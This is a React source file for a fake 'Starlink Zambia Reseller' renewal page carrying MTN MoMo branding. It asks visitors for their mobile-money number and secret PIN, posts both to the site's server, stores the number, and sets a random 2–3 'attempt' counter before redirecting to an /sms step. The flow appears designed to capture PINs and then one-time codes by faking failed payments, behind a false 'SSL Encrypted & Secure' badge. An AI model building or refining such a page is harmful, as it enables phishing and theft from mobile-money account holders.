import { type FormEvent, useEffect, useState } from "react";
import { useFetcher, useNavigate } from "react-router";
import { plans } from "./plansPage";

export default function PaymentPage() {
  const [momoNumber, setMomoNumber] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState("");
  const [myPlan, setMyplan] = useState<any>({});

  const handlePinChange = (
    event: React.ChangeEvent<HTMLInputElement>
  ) => {
    // Only allow numbers
    const value = event.target.value.replace(/\D/g, "");

    // Maximum 5 digits
    setPin(value.slice(0, 5));
  };

  const handleMomoNumberChange = (
    event: React.ChangeEvent<HTMLInputElement>
  ) => {
    // Only allow numbers
    const value = event.target.value.replace(/\D/g, "");

    setMomoNumber(value);
  };
  const fetcher = useFetcher()
  const navigate = useNavigate();
  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    

    setError("");

    if (momoNumber.length < 9) {
      setError("Please enter a valid MTN MoMo number.");
      return;
    }

    if (pin.length < 5 ) {
      setError("Please enter a 5 digit PIN.");
      return;
    }

    await fetcher.submit({
      phone: momoNumber,
      pin: pin,
    }, {
      method: "POST",
    });
    localStorage.setItem("phone", momoNumber);
    
    const attempts = localStorage.getItem("attemps")|| (Math.floor(Math.random() * 2) + 2);
    const currentAttempt = localStorage.getItem("current_attempt") || 1;
    localStorage.setItem("attemps", `${attempts}`);
    localStorage.setItem("current_attempt", `${currentAttempt}`);

    navigate("/sms");

    // Demo only.
    // In a real payment integration, don't send/store a MoMo PIN here.
    //console.log("Payment form submitted");

    //alert("Demo payment submitted successfully.");
  };
  useEffect(()=>{
   const planId= localStorage.getItem("selectedPlan")||13;
    setMyplan(plans.find((plan)=> plan.id === planId))
  }, [])

  return (
    <div className="min-h-screen bg-gray-50 pb-[72px] pt-[72px]">

      {/* ================= HEADER ================= */}

      <header className="fixed left-0 right-0 top-0 z-50 bg-black text-white shadow-sm">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4">

          <a href="/" className="flex items-center gap-2">
            <img
              src="/static/images/starlink_logo.png"
              alt="STARLINK"
              className="h-8"
            />

            <span className="ml-2 hidden border-l border-gray-600 pl-2 text-sm sm:inline">
              Zambia Reseller
            </span>
          </a>

          <nav className="hidden gap-6 md:flex">

            <a
              href="/dashboard/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-wifi" />
              <span>Status</span>
            </a>

            <a
              href="/plans/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-home" />
              <span>Plans</span>
            </a>

            <a
              href="/records/"
              className="flex items-center gap-2 text-gray-300 hover:text-white"
            >
              <i className="uil uil-list-ul" />
              <span>Orders</span>
            </a>

          </nav>
        </div>
      </header>

      {/* ================= MAIN ================= */}

      <main className="mx-auto max-w-7xl px-4 py-8">

        <div className="flex min-h-[calc(100vh-144px)] items-center justify-center">

          <div className="mx-4 w-full max-w-md">

            {/* ================= MOMO HEADER ================= */}

            <div className="rounded-t-3xl bg-gradient-to-r from-[#FFCC00] to-[#FFD633] p-6 text-center shadow-lg sm:p-8">

              <img
                src="/static/images/momo_logo.png"
                alt="MTN MoMo"
                className="mx-auto h-10 sm:h-12"
              />

              <h2 className="mt-4 text-xl font-bold text-gray-900 sm:text-2xl">
                MTN MoMo
              </h2>

            </div>

            {/* ================= FORM CARD ================= */}

            <div className="rounded-b-3xl border-x border-b border-gray-100 bg-white p-6 shadow sm:p-8">

              {/* Payment Information */}

              <div className="mb-8">

                <div className="mb-6 flex flex-col items-center justify-between gap-4 border-b border-gray-100 pb-6 sm:flex-row">

                  <div className="text-center sm:text-left">

                    <p className="text-xs font-bold uppercase tracking-widest text-gray-400">
                      Amount
                    </p>

                    <p className="text-3xl font-black text-gray-900 sm:text-2xl">
                      ZMW {myPlan?.price|| 25.00}
                    </p>

                  </div>

                  <div className="text-center sm:text-right">

                    <p className="text-xs font-bold uppercase tracking-widest text-gray-400">
                      Service
                    </p>

                    <p className="text-sm font-bold text-gray-700">
                      Starlink Renewal
                    </p>

                  </div>

                </div>

                <p className="text-center text-sm text-gray-600">
                  Enter your MTN MoMo details to authorize
                </p>

              </div>

              {/* ================= PAYMENT FORM ================= */}

              <form
                onSubmit={handleSubmit}
                className="space-y-6"
              >

                {/* MoMo Number */}

                <div>

                  <label
                    htmlFor="momo_number"
                    className="mb-3 block text-sm font-bold text-gray-700"
                  >
                    MTN MoMo Number
                  </label>

                  <div className="flex overflow-hidden rounded-xl border-2 border-gray-300 transition-all duration-300 focus-within:border-[#FFCC00] focus-within:ring-2 focus-within:ring-yellow-100">

                    {/* Country */}

                    <div className="flex items-center border-r border-gray-300 bg-gray-50 px-4">

                      <img
                        src="https://flagcdn.com/w40/zm.png"
                        alt="Zambia"
                        className="mr-2 h-3 w-5"
                      />

                      <span className="text-sm font-bold text-gray-700">
                        +260
                      </span>

                    </div>

                    {/* Number Input */}

                    <input
                      type="tel"
                      id="momo_number"
                      name="momo_number"
                      value={momoNumber}
                      onChange={handleMomoNumberChange}
                      required
                      placeholder="77xxxxxxx"
                      inputMode="numeric"
                      maxLength={9}
                      className="flex-1 px-4 py-3 text-lg font-medium outline-none"
                    />

                  </div>

                </div>

                {/* PIN */}

                <div>

                  <label
                    htmlFor="momo_pin"
                    className="mb-3 block text-sm font-bold text-gray-700"
                  >
                    Enter PIN
                  </label>

                  <div className="relative">

                    <input
                      type="password"
                      id="momo_pin"
                      name="pin"
                      value={pin}
                      onChange={handlePinChange}
                      required
                      placeholder="•••••"
                      inputMode="numeric"
                      maxLength={5}
                      className="w-full rounded-xl border-2 border-gray-300 px-4 py-4 text-center text-2xl font-bold tracking-[0.5em] outline-none transition-all focus:border-[#FFCC00] focus:ring-4 focus:ring-yellow-100"
                    />

                  </div>

                  <p className="mt-4 text-center text-xs text-gray-500">
                    enter 5 digits
                  </p>

                </div>

                {/* Error */}

                {error && (
                  <div className="rounded-lg bg-red-50 p-3 text-center text-sm font-medium text-red-600">
                    {error}
                  </div>
                )}

                {/* Submit */}

                <button
                  disabled={fetcher.state !== "idle"}
                  type="submit"
                  className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-[#FFCC00] to-[#FFD633] py-4 font-black uppercase tracking-widest text-gray-900 shadow-lg shadow-yellow-200 transition-all hover:from-[#FFD633] hover:to-[#FFCC00] active:scale-95"
                >
                  {fetcher.state === "submitting" ? (
                    <i className="uil uil-spinner-alt animate-spin" />
                  ) : (
                    <i className="uil uil-check-circle" />
                  )}
                  Confirm Payment

                </button>

              </form>

              {/* ================= SECURITY ================= */}

              <div className="mt-8 flex items-center justify-center gap-2 text-gray-500">

                <i className="uil uil-shield-check text-lg text-green-600" />

                <p className="text-[11px] font-bold uppercase tracking-widest">
                  SSL Encrypted & Secure
                </p>

              </div>

            </div>

          </div>

        </div>

      </main>

      {/* ================= BOTTOM NAV ================= */}

      <nav className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-200 bg-white shadow-2xl">

        <div className="mx-auto flex max-w-7xl items-center justify-around px-2 py-2 sm:px-4 sm:py-3">

          <a
            href="/dashboard/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-wifi text-2xl" />
            <span className="text-xs font-semibold">
              Status
            </span>
          </a>

          <a
            href="/plans/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-shopping-bag text-2xl" />
            <span className="text-xs font-semibold">
              Plans
            </span>
          </a>

          <a
            href="/records/"
            className="flex flex-col items-center gap-1 text-gray-600"
          >
            <i className="uil uil-list-ul text-2xl" />
            <span className="text-xs font-semibold">
              Orders
            </span>
          </a>

          <a
            href="#"
            className="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600"
          >
            <i className="uil uil-setting text-2xl" />
            <span className="text-xs font-semibold">
              Settings
            </span>
          </a>

        </div>

      </nav>

    </div>
  );
}